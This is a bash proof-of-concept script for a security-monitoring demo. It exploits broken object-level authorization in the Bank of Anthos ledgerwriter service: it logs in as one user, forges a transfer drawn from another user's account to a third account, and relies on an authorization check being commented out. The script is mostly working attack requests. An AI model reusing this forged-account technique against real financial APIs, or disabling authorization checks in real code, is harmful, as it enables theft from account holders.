#!/usr/bin/env bash
#
# IDOR / BOLA exploit demo against Bank of Anthos ledgerwriter.
#
# Demonstrates OWASP API1:2023 Broken Object Level Authorization: an
# authenticated user (Alice) initiates a transfer that drains funds from a
# different user's account (testuser). The ledger writer accepts it because
# the BOLA check in TransactionValidator.validateTransaction is commented out.
#
# Each step is paired with an AAP business-logic event emitted by
# LedgerWriterController:
#   * /login        -> userservice issues a JWT for Alice (acct 1033623433)
#   * /transactions -> ledgerwriter emits `transaction.attempted` and then
#                      `transaction.created`, with metadata showing
#                      from_account=1011226111 (testuser, the victim) while
#                      the trace's authenticated usr.id is Alice. That
#                      mismatch is the AAP detection signal.
#
# Requirements: kubectl, curl, jq, uuidgen, a running BoA cluster.
#
# NOT YET IMPLEMENTED! The BOLA check is enabled in the ledgerwriter service, so this will fail.

set -euo pipefail

ATTACKER_USER="alice"
ATTACKER_PASS="bankofanthos"
ATTACKER_ACCT="1033623433"
VICTIM_ACCT="1011226111"       # testuser — funds drained from here
DROP_ACCT="1077441377"         # eve — funds routed here
LOCAL_ROUTING="883745000"
AMOUNT_CENTS="${AMOUNT_CENTS:-9900}"

USERSVC_PORT=8181
LW_PORT=8182

cleanup() {
    [[ -n "${USERSVC_PF:-}" ]] && kill "$USERSVC_PF" 2>/dev/null || true
    [[ -n "${LW_PF:-}" ]] && kill "$LW_PF" 2>/dev/null || true
}
trap cleanup EXIT

echo "==> Port-forwarding userservice:${USERSVC_PORT} and ledgerwriter:${LW_PORT}"
kubectl port-forward svc/userservice "${USERSVC_PORT}:8080" >/dev/null 2>&1 &
USERSVC_PF=$!
kubectl port-forward svc/ledgerwriter "${LW_PORT}:8080" >/dev/null 2>&1 &
LW_PF=$!
sleep 2

echo "==> Step 1: log in as attacker (${ATTACKER_USER}, acct ${ATTACKER_ACCT})"
TOKEN=$(curl -sS "http://localhost:${USERSVC_PORT}/login?username=${ATTACKER_USER}&password=${ATTACKER_PASS}" | jq -r .token)
if [[ -z "${TOKEN}" || "${TOKEN}" == "null" ]]; then
    echo "ERROR: login failed" >&2
    exit 1
fi
echo "    Got JWT for ${ATTACKER_USER} (truncated): ${TOKEN:0:32}..."

echo
echo "==> Step 2: exploit IDOR — submit transfer with fromAccountNum=${VICTIM_ACCT}"
echo "    Authenticated as ${ATTACKER_USER} (${ATTACKER_ACCT})"
echo "    Forging fromAccountNum to victim (${VICTIM_ACCT}, testuser)"
echo "    Routing \$$(awk "BEGIN {printf \"%.2f\", ${AMOUNT_CENTS}/100}") to ${DROP_ACCT} (eve)"

UUID=$(uuidgen)
BODY=$(cat <<EOF
{
  "fromAccountNum": "${VICTIM_ACCT}",
  "fromRoutingNum": "${LOCAL_ROUTING}",
  "toAccountNum": "${DROP_ACCT}",
  "toRoutingNum": "${LOCAL_ROUTING}",
  "amount": ${AMOUNT_CENTS},
  "uuid": "${UUID}"
}
EOF
)

RESP=$(curl -sS -o /tmp/idor-resp.txt -w "%{http_code}" \
    -X POST "http://localhost:${LW_PORT}/transactions" \
    -H "Authorization: Bearer ${TOKEN}" \
    -H "Content-Type: application/json" \
    -d "${BODY}")

echo "    HTTP ${RESP}"
echo "    Body: $(cat /tmp/idor-resp.txt)"

if [[ "${RESP}" == "201" ]]; then
    echo
    echo "==> EXPLOIT SUCCEEDED: ledger accepted the transaction."
    echo "    In Datadog, look for the matching APM trace + AAP business-logic"
    echo "    event 'transaction.created' with from_account=${VICTIM_ACCT}"
    echo "    while the trace's authenticated usr.id is ${ATTACKER_USER}."
else
    echo
    echo "==> Exploit blocked (HTTP ${RESP}). Either the BOLA check is enabled,"
    echo "    a different validation failed, or balances are insufficient."
fi